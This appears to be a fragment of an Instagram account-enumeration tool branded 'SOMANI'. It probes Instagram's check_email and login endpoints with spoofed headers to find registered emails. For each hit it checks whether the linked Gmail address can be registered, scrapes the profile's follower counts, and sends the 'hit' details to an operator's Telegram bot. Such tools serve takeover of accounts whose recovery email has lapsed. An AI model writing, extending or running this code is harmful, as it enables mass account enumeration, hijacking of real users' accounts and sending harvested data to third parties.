 if ch == "1":
        ch = 2012
  elif ch == "2":
        ch = 2013
  elif ch == "3":
        ch = 2014
  elif ch == "4":
        ch = 2015
  elif ch == "5":
        ch = 2016
  elif ch == "6":
        ch = 2017
  elif ch == "7":
        ch = 2018
  elif ch == "8":
        ch = 2019
  elif ch == "9":
        ch = 2020

                                                  
  hits+=1
  if hits % 10 == 0 and os.path.exists("tl.txt"):
        os.remove("tl.txt")

  try:
      url = f'https://www.instagram.com/{username}/'
      username = url.strip('/').split('/')[-1]
      response = requests.get(url)
      soup = BeautifulSoup(response.text, 'html.parser')
      meta_description = soup.find('meta', attrs={'name': 'description'})
      name_tag = soup.find('meta', property='og:title')

      if meta_description and name_tag:
            content = meta_description.get('content').replace(',', '')
            parts = content.split()

            posts = parts[4]
            followers = parts[0]
            following = parts[2]

            name = name_tag['content'].split('(@')[0].strip()


            msg = f'''

╭━━━〔 ⚜️ SOMANI ⚜️ 〕━━━╮

⟡ 𝐆𝐌𝐀𝐈𝐋 𝐇𝐈𝐓 𝐈𝐍𝐅𝐎 ⟡

❖ 🧑‍💼 Name        : {name}
❖ 🆔 Username    : @{username}
❖ 📮 Email        : {username}@{jj}

────────────────────
❖ 👥 Followers   : {followers}
❖ 🔁 Following   : {following}
❖ 🖼 Posts        : {posts}
────────────────────

❖ 📅 Acc Created : {ch}
❖ 🌐 Profile     : https://www.instagram.com/{username}/
❖ ♻️ Status      : {rest(username)}

╰━━━〔 🦅 SOMANI ERA 💓🤍〕━━━╯

━━━━━━━━━━━━━━━━━━━━
📢 CHANNEL : @somanieraa
👑 ADMIN   : @somani_07x
━━━━━━━━━━━━━━━━━━━━
        '''
      with open('zeno1.txt','a') as ff:
            ff.write(f'{msg}\n')
      try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}")
      except:pass

  except:
    msg = f'''
╭━━━〔 ⚜️ SOMANI ⚜️ 〕━━━╮

⟡ 𝐆𝐌𝐀𝐈𝐋 𝐇𝐈𝐓 𝐈𝐍𝐅𝐎 ⟡

❖ 🧑‍💼 Name        : {name}
❖ 🆔 Username    : @{username}
❖ 📮 Email        : {username}@{jj}

────────────────────
❖ 👥 Followers   : {followers}
❖ 🔁 Following   : {following}
❖ 🖼 Posts        : {posts}
────────────────────

❖ 📅 Acc Created : {ch}
❖ 🌐 Profile     : https://www.instagram.com/{username}/
❖ ♻️ Status      : {rest(username)}

╰━━━〔 🦅 SOMANI ERA💓🤍〕━━━╯

━━━━━━━━━━━━━━━━━━━━
📢 CHANNEL : @somanieraa
👑 ADMIN   : @somani_07x
━━━━━━━━━━━━━━━━━━━━
        '''

    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}")
    except:pass
    with open('hits1.txt','a') as ff:
        ff.write(f'{msg}\n')
def Guts(email):
  global bads_email
  try:

    if 'good' == check_gmail(email):
        username,jj=email.split('@')
        info(username,jj)
    else:bads_email+=1
  except:''

def check(email):
  global bads_instgram,hits,bads_email
  try:
    csrftoken = md5(str(time.time()).encode()).hexdigest()
    ua=generate_user_agent()
    pp=choice('00')
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""{BOLD}{MAGENTA}
   ╔════════════〔 🧿 SOMANI X  𝑺𝑻𝑨𝑻𝑺 🧿 〕════════════╗
{RESET}
 {CYAN}〔1〕{YELLOW} 🎯 𝐇𝐈𝐓𝐒           ➤   {GREEN}[ {hits} ]
 {CYAN}〔2〕{YELLOW} ❌ 𝐁𝐀𝐃            ➤    {RED}[ {bads_instgram} ]
 {CYAN}〔3〕{YELLOW} 📭 𝐄𝐌𝐀𝐈𝐋          ➤   {MAGENTA}[ {bads_email} ]
 {CYAN}〔4〕{YELLOW} 📧 𝐄𝐌𝐀𝐈𝐋          ➤    {BLUE}[ {email} ]

{DIM}    ╟──────────────────────────────────────────╢             {RESET}
{BOLD}{WHITE}                     🦅 𝐁𝐘 SOMANI 🦅
{MAGENTA}  ╚═════════════════════════════════════════════╝             {RESET}
""")

    if pp == '0':
      headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/signup/email/',
        'user-agent': ua,
        'x-csrftoken': csrftoken
    }
      data = {
        'email': email,
    }
      response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)

      if 'email_is_taken' in str(response.text):Guts(email)
      else:bads_instgram+=1
    elif pp == '1':
      headers = {
          'accept': '*/*',
          'accept-language': 'en-US,en;q=0.9',
          'content-type': 'application/x-www-form-urlencoded',
          'origin': 'https://www.instagram.com',
          'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
          'user-agent': ua,
          'x-csrftoken': csrftoken,
      }
      data = {
          'username': email,
      }
      response = requests.post(
          'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
          headers=headers,
          data=data,
      ).text

      if '"user":true' in response:Guts(email)
      else:bads_instgram+=1
  except:
      print(f"""{BOLD}{MAGENTA}
   ╔════════════〔 🧿 SOMANI X 𝑺𝑻𝑨𝑻𝑺 🧿 〕════════════╗
{RESET}
 {CYAN}〔1〕{YELLOW} 🎯 𝐇𝐈𝐓𝐒           ➤   {GREEN}[ {hits} ]
 {CYAN}〔2〕{YELLOW} ❌ 𝐁𝐀𝐃            ➤    {RED}[ {bads_instgram} ]
 {CYAN}〔3〕{YELLOW} 📭 𝐄𝐌𝐀𝐈𝐋          ➤   {MAGENTA}[ {bads_email} ]
 {CYAN}〔4〕{YELLOW} 📧 𝐄𝐌𝐀𝐈𝐋          ➤    {BLUE}[ {email} ]

{DIM}    ╟──────────────────────────────────────────╢             {RESET}
{BOLD}{WHITE}                     🦅 𝐁𝐘 SOMANI 🦅
{MAGENTA}  ╚═════════════════════════════════════════════╝             {RESET}
""")



def rand_ids(existing_ids):
    global uid1 ,uid2
    while True:
        Id = str(random.randrange(uid1,uid2))
        if Id not in existing_ids:
            existing_ids.add(Id)
            return Id

def collect_users_1():
    ids_1 = set()
    found_usernames_1 = set()
